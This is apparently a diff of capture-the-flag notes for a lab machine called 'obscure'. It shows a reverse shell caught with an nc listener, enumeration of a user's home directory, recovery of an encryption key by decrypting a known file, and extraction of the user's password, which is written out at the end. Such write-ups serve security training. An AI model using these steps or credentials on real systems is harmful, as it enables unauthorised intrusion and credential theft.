@@ -23,3 +23,70 @@ allenwest1@debian:~/Desktop$ nc -lvp 12345
 listening on [any] 12345 ...
 10.10.10.168: inverse host lookup failed: Unknown host
 connect to [10.10.14.5] from (UNKNOWN) [10.10.10.168] 49656
+www-data@obscure:/$ whoami
+whoami
+www-data
+www-data@obscure:/$ cd /home
+cd /home
+www-data@obscure:/home$ ls
+ls
+robert
+www-data@obscure:/home$ cd robert
+cd robert
+www-data@obscure:/home/robert$ ls
+ls
+BetterSSH
+check.txt
+out.txt
+passwordreminder.txt
+SuperSecureCrypt.py
+user.txt
+www-data@obscure:/home/robert$ cat user.txt
+cat user.txt
+cat: user.txt: Permission denied
+www-data@obscure:/home/robert$ cat passwordreminder.txt
+cat passwordreminder.txt
+ÑÈÌÉàÙÁÑé¯·¿kwww-data@obscure:/home/robert$ ls
+ls
+BetterSSH
+check.txt
+out.txt
+passwordreminder.txt
+SuperSecureCrypt.py
+user.txt
+www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i out.txt -o /tmp/key.txt -k "$(cat check.txt)" -d
+k.txt)" -dperSecureCrypt.py -i out.txt -o /tmp/key.txt -k "$(cat check
+################################
+#           BEGINNING          #
+#    SUPER SECURE ENCRYPTOR    #
+################################
+  ############################
+  #        FILE MODE         #
+  ############################
+Opening file out.txt...
+Decrypting...
+Writing to /tmp/key.txt...
+www-data@obscure:/home/robert$ cat /tmp/key.txt
+cat /tmp/key.txt
+alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichaiwww-data@obscure:/home/robert$ 
+www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i passwordreminder.txt -o /tmp/password -k alexandrovich -d
+-k alexandrovich -dCrypt.py -i passwordreminder.txt -o /tmp/password -
+################################
+#           BEGINNING          #
+#    SUPER SECURE ENCRYPTOR    #
+################################
+  ############################
+  #        FILE MODE         #
+  ############################
+Opening file passwordreminder.txt...
+Decrypting...
+Writing to /tmp/password...
+www-data@obscure:/home/robert$ cat /tmp/password
+cat /tmp/password
+SecThruObsFTW
+www-data@obscure:/home/robert$ 
+.
+.
+.
+// robert:SecThruObsFTW
+.
